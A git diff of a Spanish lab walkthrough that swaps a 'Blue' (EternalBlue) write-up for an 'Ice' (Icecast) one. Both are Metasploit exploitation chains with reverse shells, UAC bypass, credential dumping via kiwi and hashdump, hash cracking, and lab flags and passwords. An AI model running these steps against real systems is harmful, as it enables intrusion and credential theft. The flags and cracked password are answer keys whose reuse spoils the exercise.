@@ -1,190 +1,233 @@
-# Blue
+# Ice
 
 ## nmap
 
-Primero hacemos un escaneo de los puertos abiertos y vulnerables con `nmap`:
+Después de esperar unos minutos a que inicie la máquina, escaneamos los puertos.
 
 ```
-nmap -sV --script vuln -v 10.10.223.217
+nmap -A -T4 -p- 10.10.39.57
 ```
 
-![[Pasted image 20250220183330.png]]
-
-## Explotación del exploit
-
-Tenemos al menos 3 puertos abiertos con un número de menos de 1000.
+![Escaneo de puertos](images/Pasted%20image%2020250221122600.png)
 
 Y estos son los resultados del script:
 
-![[Pasted image 20250220183432.png]]
+![Resultados del script](images/Pasted%20image%2020250221122646.png)
 
-Nos indica que puede haber una vulnerabilidad, concretamente la de `CVE-2017-0143`. La máquina es vulnerable a `ms08–067`.
+El puerto 8000 es el de `Icecast` y el hostname es `DARK-PC`.
 
-Iniciamos la consola de metasploit.
+```
+sudo nmap -sS 10.10.39.57
+```
+
+![Escaneo de puertos con sudo](images/Pasted%20image%2020250221123829.png)
+
+Verificamos si hay vulnerabilidades mediante el script de `nmap`. Tardará unos minutos en completarse.
+
+```
+nmap -T4 -A -p- --script=vuln 10.10.39.57 -vv
+```
+
+Se ha detectado una vulnerabilidad `ms17-010`cuyo CVE es `CVE-2017-0143` además de `CVE-2007-6750`-
+
+![Vulnerabilidad MS17-010](images/Pasted%20image%2020250221125732.png)
+
+![Vulnerabilidades detectadas](images/Pasted%20image%2020250221125321.png)
+
+Buscamos la vulnerabilidad de `Icecast` también.
+
+https://www.cvedetails.com/cve/CVE-2004-1561/
+## Obtener acceso
+
+Abrimos la consola de metasploitable:
 
 ```
 msfconsole
 ```
 
-Buscamos la vulnerabilidad.
+Buscamos el exploit de `Icecast`:
 
 ```
-search ms17-010
+search icecast
 ```
 
-![[Pasted image 20250220184127.png]]
-
-Seleccionamos el módulo.
+Cargamos el exploit:
 
 ```
 use 0
 ```
+![Cargando exploit de Icecast](images/Pasted%20image%2020250221130420.png)
 
-Mostramos las opciones a configurar para el exploit.
+Configuramos las opciones.
+
+
+```
+set RHOST 10.10.39.57
+set LHOST 10.8.3.33
+```
+
+![Configurando opciones del exploit](images/Pasted%20image%2020250221130610.png)
+
+Ejecutamos el exploit:
+
+```
+run
+```
+
+![Ejecutando el exploit](images/Pasted%20image%2020250221130948.png)
+
+## Escalada de privilegios
+
+Introducimos el siguiente comando para ver el server username:
+
+```
+getuid
+```
+![Obteniendo el User ID](images/Pasted%20image%2020250221131452.png)
+
+Para ver la información del sistema:
+
+```
+sysinfo
+```
+
+![Información del sistema](images/Pasted%20image%2020250221131546.png)
+
+Ahora que conocemos la arquitectura de los procesos, vamos a hacer un reconocimiento más avanzado de los mismos:
+
+```
+run post/multi/recon/local_exploit_suggester
+```
+
+![Ejecutando el exploit suggester](images/Pasted%20image%2020250221132008.png)
+
+Ponemos el proceso en el background:
+
+```
+background
+```
+
+Usamos el siguiente exploit:
+
+```
+use exploit/windows/local/bypassuac_eventvwr
+```
+![Usando exploit bypassuac_eventvwr](images/Pasted%20image%2020250221132232.png)
+
+Vemos las opciones y asignamos la sesión:
 
 ```
 options
+set session 2 
 ```
 
-![[Pasted image 20250220184233.png]]
+> Hay que asegurarse bien de qué sesión es con el comando `sessions`.
 
-Configuramos la IP del host remoto y la IP local que obtuvimos de la VPN para conectarnos a la máquina.
-
-```
-set RHOST IP_Maquina_Vulnerable
-set LHOST IP_Maquina_Kali
-```
-
-![[Pasted image 20250220184424.png]]
-
-Cargamos el payload que vamos a utilizar.
-
-```
-set payload windows/x64/shell/reverse_tcp
-```
-
-E iniciamos el exploit:
+Iniciamos el exploit:
 
 ```
 run
 ```
 
-![[Pasted image 20250220184633.png]]
+![Iniciando el exploit](images/Pasted%20image%2020250221132414.png)
 
-Tardará unos minutos en completarse.
-
-![[Pasted image 20250221114033.png]]
-
-Le damos a `Ctrl + Z` para dejar el proceso en el background.
-## Escala de privilegios
-
-Ahora vamos a convertir la shell a meterpreter shell.
+Ahora lo ejecutamos con una interfaz disntinta:
 
 ```
-use post/multi/manage/shell_to_meterpreter
-```
-
-![[Pasted image 20250220185116.png]]
-
-Con el comando `SESSIONS`vemos las sesiones activas de fondo.
-
-![[Pasted image 20250221113308.png]]
-
-Asignamos la sesión:
-
-```
-set session 1
 set LHOST tun0
 ```
 
-Y ejecutamos el exploit:
+Ejecutamos el siguiente comando una vez obtenemos acceso:
 
 ```
-run
+getprivs
 ```
 
-Seleccionamos la sesión que nos ha abierto nueva el exploit.
+![Obteniendo privilegios](images/Pasted%20image%2020250221132709.png)
+
+El permiso de `SeTakeOwnershipPrivilege`es el que permite obtener la propiedad de una archivo.
+
+## Looting
+
+Visualizamos los procesos del sistema con el comando `ps`:
+
+![Procesos del sistema](images/Pasted%20image%2020250221133657.png)
+
+Migramos el proceso con el siguiente comando:
 
 ```
-sessions 2
+migrate -N spoolsv.exe
 ```
 
-![[Pasted image 20250221114739.png]]
+![Migrando el proceso](images/Pasted%20image%2020250221133807.png)
 
-Hemos escalado hasta NT authority en el sistema.
-
-![[Pasted image 20250221114824.png]]
-
-## Crackeando las contraseñas
-Ponemos en el background la sesión con `Ctrl + Z` y listamos los procesos.
+Confirmamos que ahora somos NT Authority.
 
 ```
-ps
+getuid
 ```
 
-![[Pasted image 20250221115020.png]]
+![Confirmando permisos NT Authority](images/Pasted%20image%2020250221133907.png)
 
-Migramos el proceso de `spoolsv.exe`.
-
-```
-migrate 1292
-```
-
-![[Pasted image 20250221115735.png]]
-
-Dumpeamos las contraseñas del sistema.
+Ahora que tenemos todos los permisos, vamos a usar el comando `kiwi`. Escribimos el comando `help` que muestra todas las funciones de la herramienta.
 
 ```
-hashdump
+load kiwi
+help
 ```
+![Ayuda de Kiwi](images/Pasted%20image%2020250221134221.png)
 
-![[Pasted image 20250221115838.png]]
+![Funciones de Kiwi](images/Pasted%20image%2020250221134301.png)
 
-Copiamos estos resultados a un fichero llamado `hash.txt` y usamos john the ripper para crackear las contraseñas.
-
-```
-john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
-
-![[Pasted image 20250221120308.png]]
-
-## Flags
-
-Obtenemos la primera flag de la siguiente manera:
-
-![[Pasted image 20250221120526.png]]
+Para obtener todos los credenciales usaremos el siguiente comando:
 
 ```
-flag{access_the_machine}
+creds_all
 ```
 
-La segunda flag se encuentra aquí:
+![Obteniendo credenciales](images/Pasted%20image%2020250221134352.png)
 
-![[Pasted image 20250221120740.png]]
+También podemos usar `hashdump`y crackear los hashes.
+
+![Ejecutando hashdump](images/Pasted%20image%2020250221134431.png)
+
+En la siguient página podemos crackearlos.
+
+https://crackstation.net/
+
+Este es el de Dark:
 
 ```
-flag{sam_database_elevated_access}
+7c4fe5eada682714a036e39378362bab
 ```
 
-Finalmente, la localización de la última flag es en documentos:
+![Cracking el hash](images/Pasted%20image%2020250221134641.png)
 
-![[Pasted image 20250221120846.png]]
+La contraseña es `Password01!`.
 
-```
-flag{admin_documents_can_be_valuable}
-```
+## Post-Exploitation
 
+- ¿Qué comando nos metire dumpear todas los hashes de las contraseñas del sistema?
 
-
-
+**hashdump**
 
 
+- ¿Qué comando nos permite ver el escritorio remoto del usuario en tiempo real?
+
+**Screenshare**
+
+- Si quisiéramos grabar desde un micrófono conectado al equipo, ¿qué comando nos lo permitiría?
+
+**record_mic**
+
+- Podemos modificar las marcas de tiempo de los archivos del sistema. ¿Qué comando nos permite hacerlo?
+
+**timestomp**
 
 
+- Mimikatz nos permite crear lo que se denomina un «ticket dorado», que nos permite autenticarnos en cualquier lugar con facilidad. ¿Qué comando nos permite hacer esto?
 
-
-
-
+**golden_ticket_create**
 
 
 
